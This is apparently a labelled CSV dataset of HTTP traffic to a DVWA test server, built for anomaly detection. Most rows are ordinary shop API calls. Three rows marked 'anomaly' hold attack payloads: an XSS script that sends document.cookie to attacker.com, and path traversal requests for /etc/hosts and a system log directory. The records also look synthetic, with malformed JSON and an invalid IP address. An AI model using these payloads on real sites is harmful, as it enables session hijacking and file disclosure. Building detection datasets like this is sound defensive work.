timestamp,agent,method,request_body,request_headers,request_url,response_body,response_headers,response_size,source_ip,source_port,status,target_ip,target_port,157,user_identity,anomaly
2023/7/19 14:15,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {quantity"": 1; ""productName"": ""Product C""; ""productId"": ""item389""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/security.php; Content-Length:224; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /reviews,"{""reviewId"": ""review389""; ""userId"": 375; ""productId"": ""item389""; ""rating"": 5; ""reviewDescription"": ""High Quality""}","Date:Wed, 19 Jul 2023 06:15:04 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Set-Cookie:security=impossible; path=/; httponly; Location:/dvwa/security.php; Content-Length:134; Content-Type:text/html; charset=UTF-8; security:impossible;  path:/;  httponly: ;",525,  192.168.135.71,62186,200,  10.26.40.155,80,947,user,normal
2023/7/19 14:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_s/; Content-Length:92; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /customers/abc123,"{""firstName"": ""John"";""lastName"": ""Smith"";""email"": ""jsmith@example.com""; ""phone"": ""123456789"";}","Date:Wed, 19 Jul 2023 06:46:56 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5018; Content-Type:text/html;charset=utf-8;",464,  192.168.135.71,59845,200,  10.26.40.155,80,636,admin,normal
2023/7/19 13:59,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {quantity"": 3}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_d/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /inventory/item789,"{""itemId"": ""item789""; ""quantity"": 3; ""restock"": true}","Date:Wed, 19 Jul 2023 05:59:33 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4758; Content-Type:text/html;charset=utf-8;",834,  192.168.176.31,54441,200,  10.26.45.158,80,461,admin,normal
2023/7/19 13:47,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PATCH," {""address"": ""123 Main Street""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:81; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /users/user567,"{""id"": 567; ""name"": ""John Doe""; ""address"": ""123 Main Street""}","Date:Wed, 19 Jul 2023 05:47:35 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5111; Content-Type:text/html;charset=utf-8;",210,  192.168.135.71,52434,200,  10.26.40.155,80,200,user,normal
2023/7/19 14:37,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {userId"": 286;""cartItemId"": ""item456"";""quantity"": 10}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:148; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /updateCart,"{""userId"": 286;""cartItemId"": ""item456"";""quantity"": 10;""status"": ""Updated""}","Date:Wed, 19 Jul 2023 06:37:33 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",84,  205.68.101.10,60032,200,  10.14.52.150,80,798,admin,normal
2023/7/19 14:19,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,POST,"{""itemId"": ""item456"";""productName"": ""Product B"";""price"": 39.99}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/collections?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,"{""itemId"": ""item456"";""productName"": ""Product B"";""price"": 39.99}","Date:Wed, 19 Jul 2023 05:51:58 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5410; Content-Type:text/html;charset=utf-8;",2006,192.168.135.71,52800,201,10.26.40.155,80,865,user,anomaly
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {userID"": 123; ""paymentMethod"": ""PayPal""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/security.php; Content-Length:72; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /checkout,"{""transactionID"": ""txn456""; ""status"": ""Successful""}","Date:Wed, 19 Jul 2023 05:46:07 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Set-Cookie:security=impossible; path=/; httponly; Location:/dvwa/security.php; Content-Length:134; Content-Type:text/html; charset=UTF-8; security:impossible;  path:/;  httponly: ;",1400,  192.168.135.71,51750,200,  10.26.40.155,80,352,user,normal
2023/7/19 14:25,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""content"": ""Highly recommend this item!""; ""userId"": ""user345""; ""productId"": ""product123""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:180; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products/123/comments,"{""content"": ""Highly recommend this item!""; ""userId"": ""user345""; ""productId"": ""product123""; ""id"": 124}","Date:Wed, 19 Jul 2023 06:25:33 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",719,  192.168.135.71,53940,200,  10.26.40.155,80,441,user,normal
2023/7/19 14:02,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {name"": ""Jane Doe"";""address"": ""123 Maple St""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/logout.php; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /users/123,"{""id"": 123;""name"": ""Jane Doe"";""address"": ""123 Maple St"";""password"": ""qwerty123""}","Date:Wed, 19 Jul 2023 06:02:27 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1627; Content-Type:text/html;charset=utf-8;",468,  192.168.135.71,68792,200,  10.26.40.155,80,745,admin,normal
2023/7/19 13:53,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/open_redirect/source/impossible.php?redirect=1; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /cart?page=4&limit=25,"[{""itemId"": ""item3456""; ""productName"": ""Product I""; ""price"": 19.99}; {""itemId"": ""item89012""; ""productName"": ""Product M""; ""price"": 12.45}]","Date:Wed, 19 Jul 2023 05:51:53 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Content-Length:162; Connection:close; Content-Type:text/html; charset=UTF-8;",950,  172.25.63.122,55743,200,  10.15.189.35,80,699,user,normal
2023/7/19 14:13,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/open_redirect/source/impossible.php?redirect=1; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products?search=shoe,"{""productId"": 1;""productName"": ""Nike shoes"";""brand"": ""Nike"";""price"": 120;""color"": ""black""}","Date:Wed, 19 Jul 2023 06:11:48 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Content-Length:162; Connection:close; Content-Type:text/html; charset=UTF-8;",589,  192.168.135.71,45310,200,  10.26.40.155,80,760,user,normal
2023/7/18 14:57,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", GET,  nan,"Host:10.26.40.155; Connection:keep-alive; Content-Length:88; Cache-Control:max-age=0; Upgrade-Insecure-Requests:1; Origin:http://10.26.40.155; Content-Type:application/x-www-form-urlencoded; Accept:text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9; Referer:http://10.26.40.155/dvwa/login.php; Accept-Encoding:gzip, deflate; Accept-Language:zh-CN,zh;q=0.9; Cookie:security=impossible; PHPSESSID=jpicemclmlqdd5gtheq7tcrg75;",  /admin/afterSaleServices/service716,"{""serviceId"": ""service716""; ""userId"": 716; ""orderItemId"": ""item629""; ""status"": ""Completed""; ""details"": ""Product replaced.""}","Date:Tue, 18 Jul 2023 06:57:18 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:index.php; Content-Length:134; Keep-Alive:timeout=5, max=96; Connection:Keep-Alive; Content-Type:text/html; charset=UTF-8;",41,  192.168.135.71,56436,200,  10.26.40.155,80,962,admin,normal
2023/7/19 14:45,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/exec/; Content-Length:64; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products?page=2&limit=20,"{""itemId"": ""item456"";""productName"": ""Product B"";""price"": 39.99}","Date:Wed, 19 Jul 2023 06:45:59 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4382; Content-Type:text/html;charset=utf-8;",1495,  192.168.135.71,56512,200,  10.26.40.155,80,420,user,normal
2023/7/19 14:32,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:95; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /search?keyword=tv,"{""itemId"": ""item889"";""productName"": ""Product F"";""category"": ""Televisions"";""price"": 245.99}","Date:Wed, 19 Jul 2023 06:32:32 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",340,  192.168.135.71,54991,200,  10.26.40.155,80,592,user,normal
2023/7/19 14:01,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:168; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /inventories/item123,"{""itemId"": ""item123""; ""quantity"": 4; ""lastOrdered"": ""2019-03-25""}""","Date:Wed, 19 Jul 2023 06:01:25 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",158,  192.168.135.71,54535,200,  10.26.40.155,80,393,user,normal
2023/7/19 14:31,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET," {userId"": ""user456""; ""dateRange"": ""2020-08-01 to 2020-08-31""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/setup.php; Content-Length:106; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /statistics,"{""sessions"": 1000; ""activeUserRatio"": 0.8}","Date:Wed, 19 Jul 2023 06:31:41 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:/dvwa/setup.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",112,  192.168.135.71,18725,200,  10.26.40.155,80,991,user,normal
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,GET,null,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/open_redirect/source/impossible.php?redirect=1; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/afterSaleServices/service789/../../etc/hosts,"{""serviceId"": ""service789""; ""userId"": 789; ""orderItemId"": ""item101""; ""status"": ""Pending""; ""type"": ""Exchange""; ""reason"": ""Received wrong size.""; ""quantity"": 1}","Date:Wed, 19 Jul 2023 06:46:25 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Content-Length:162; Connection:close; Content-Type:text/html; charset=UTF-8;",118,192.168.135.71,60917,200,10.26.40.155,80,821,user,anomaly
2023/7/19 13:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,GET,null,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_r/?name=ZAP&user_token=56528aabaab129572480521fbaed84a6; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/afterSaleServices/service101/../../../sys_log/,"{""serviceId"": ""service101""; ""userId"": 101; ""orderItemId"": ""item202""; ""status"": ""Pending""; ""type"": ""Refund""; ""reason"": ""Items not as described.""; ""quantity"": 3}","Date:Wed, 19 Jul 2023 06:48:53 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4476; Content-Type:text/html;charset=utf-8;",851,192.168.135.71,61191,200,10.26.40.155,80,547,user,anomaly
2023/7/19 14:42,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""email"": ""john.smith@example.com""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/captcha/; Content-Length:120; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /users,"{""success"": true; ""userId"": ""user234""}","Date:Wed, 19 Jul 2023 06:42:26 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5843; Content-Type:text/html;charset=utf-8;",2450,  192.168.127.54,53680,200,  10.26.46.101,80,999,admin,normal
2023/7/19 13:51,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, DELETE," {""id"": ""12345""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/xss_r/?name=ZAP&user_token=56528aabaab129572480521fbaed84a6; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /userProfiles,"{""message"": ""Deletion successful.""}","Date:Wed, 19 Jul 2023 05:51:55 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4476; Content-Type:text/html;charset=utf-8;",420,  82.219.211.134,10692,200,  20.41.81.198,80,125,user,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Content-Length:75;,  /transactions/456,"{""transactionId"": ""transaction456; ""transactionType"": ""Withdrawal; ""accountId"": ""account123; ""paymentMethodId"": ""card456; ""amount"": 500}","Date:Wed, 19 Jul 2023 05:55:54 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; Last-Modified:Wed, 22 Mar 2023 11:17:19 GMT; ETag: 61c3-5f77b4da12dc0 ; Accept-Ranges:bytes; Content-Length:25027;",203,  192.168.13.45,42096,200,  134.122.11.355,80,580,user,normal
2023/7/19 14:45,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {serviceId"": ""service123""; ""orderItemId"": ""item234""; ""status"": ""Approved""; ""details"": ""Request for refund approved.""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/exec/; Content-Length:95; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /admin/afterSaleServices,"{""serviceId"": ""service123""}","Date:Wed, 19 Jul 2023 06:45:57 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4382; Content-Type:text/html;charset=utf-8;",830,  192.168.135.71,53835,200,  10.26.40.155,80,374,admin,normal
2023/7/19 14:17,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {quantity"": 2; ""remarks"": ""additional info""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/setup.php; Content-Length:429; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /orders/order123/items/item1,"{""orderId"": ""order123""; ""itemId"": ""item1""; ""quantity"": 2; ""remarks"": ""additional info""}","Date:Wed, 19 Jul 2023 06:17:26 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:/dvwa/setup.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",53,  192.168.135.71,32100,201,  10.26.40.155,80,745,admin,normal
2023/7/19 14:32,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {itemId"": ""item123"";""quantity"": 4}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:95; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /checkout/xyz123,"{""checkoutId"": ""xyz123"";""itemId"": ""item123"";""quantity"": 4;""totalAmount"": 120.00;""status"": ""Success""}","Date:Wed, 19 Jul 2023 06:32:32 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",100,  192.168.135.71,61970,401,  10.26.40.155,80,923,user,normal
2023/7/19 14:49,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""orderId"": ""order345""; ""paymentMethod"": ""CreditCard""; ""amount"": 698.45}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/setup.php; Content-Length:122; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /makePayment,"{""orderId"": ""order345""; ""paymentMethod"": ""CreditCard""; ""amount"": 698.45; ""paymentStatus"": ""Success"";""transactionId"": ""trx987"";}","Date:Wed, 19 Jul 2023 06:49:08 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:/dvwa/setup.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",13568,  192.168.135.71,50559,200,  10.26.40.155,80,569,user,normal
